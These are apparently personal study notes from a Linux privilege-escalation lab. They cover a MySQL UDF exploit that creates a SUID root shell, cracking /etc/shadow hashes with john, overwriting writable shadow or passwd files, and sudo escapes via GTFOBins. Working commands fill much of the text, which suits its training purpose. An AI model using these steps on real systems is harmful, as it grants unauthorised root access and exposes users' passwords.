# Privilege escalation

This is a brief brain map on privilege escalation on linux system

## Service exploits
The MySQL service is running as root and the "root" user for the service does not have a password assigned. We can use a [popular exploit](https://www.exploit-db.com/exploits/1518) that takes advantage of User Defined Functions (UDFs) to run system commands as root via the MySQL service.

Compile the raptor\_udf2.c exploit code using the following commands => found on exploit db
```bash
gcc -g -c raptor\_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc  
```
Connect to the MySQL service as the root user with a blank password:
```
mysql -u root
```
Execute the following commands on the MySQL shell to create a User Defined Function (UDF) "do\_system" using our compiled exploit:
```mysql
use mysql;  
create table foo(line blob);  
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));  
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';  
create function do_system returns integer soname 'raptor_udf2.so';`
```
Use the function to copy /bin/bash to /tmp/rootbash and set the SUID permission:
```
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');`
```
Exit out of the MySQL shell (type **exit** or **\\q** and press **Enter**) and run the /tmp/rootbash executable with -p to gain a shell running with root privileges:
```
Exit out of the MySQL shell (type **exit** or **\\q** and press **Enter**) and run the /tmp/rootbash executable with -p to gain a shell running with root privileges:
```
now execute `/tmp/rootbash -p`
```
/tmp/rootbash -p`
```

**overview:**
My sql is runnig as root. we are able take advantage of it. all commads and queries mentioned above is commented on the exploitdb. all we need to do is find out privilege escalation vector with some reconnaissance

## Weak file permission 
### /etc/shadow readable
file permissions are another vector for privilege escalation.

The /etc/shadow file contains user password hashes and is usually readable only by the root user.
Note that the /etc/shadow file on the VM is world-readable:
Each line of the file represents a user. A user's password hash (if they have one) can be found between the first and second colons (:) of each line.

Save the root user's hash to a file called hash.txt on your Kali VM and use john the ripper to crack it. You may have to unzip /usr/share/wordlists/rockyou.txt.gz first and run the command using sudo depending on your version of Kali
we can crack files with hash cracker tools like john, hashcat etc...
```
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```


### /etc/shadow writable

The /etc/shadow file contains user password hashes and is usually readable only by the root user.

check that the /etc/shadow file is writable or not:
`ls -l /etc/shadow`

Generate a new password hash with a password of your choice:
`mkpasswd -m sha-512 newpasswordhere`  

Edit the /etc/shadow file and replace the original root user's password hash with the one you just generated.

Switch to the root user, using the new password:
`su root`

### /etc/passwd writable

The /etc/passwd file contains information about user accounts. It is world-readable, but usually only writable by the root user. Historically, the /etc/passwd file contained user password hashes, and some versions of Linux will still allow password hashes to be stored there.

check that the /etc/passwd file is world-writable:
`ls -l /etc/passwd`

Generate a new password hash with a password of your choice:
`openssl passwd newpasswordhere`

Edit the /etc/passwd file and place the generated password hash between the first and second colon (:) of the root user's row (replacing the "x").

Switch to the root user, using the new password:
`su root`

Alternatively, copy the root user's row and append it to the bottom of the file, changing the first instance of the word "root" to "newroot" and placing the generated password hash between the first and second colon (replacing the "x").  

Now switch to the newroot user, using the new password:
`su newroot`

## sudo

### shell escape sequences
List the programs which sudo allows your user to run:
`sudo -l`

Visit GTFOBins ([https://gtfobins.github.io](https://gtfobins.github.io/)) and search for some of the program names. If the program is listed with "sudo" as a function, you can use it to elevate privileges, usually via an escape sequence.

Choose a program from the list and try to gain a root shell, using the instructions from GTFOBins.


### Enviroment variables

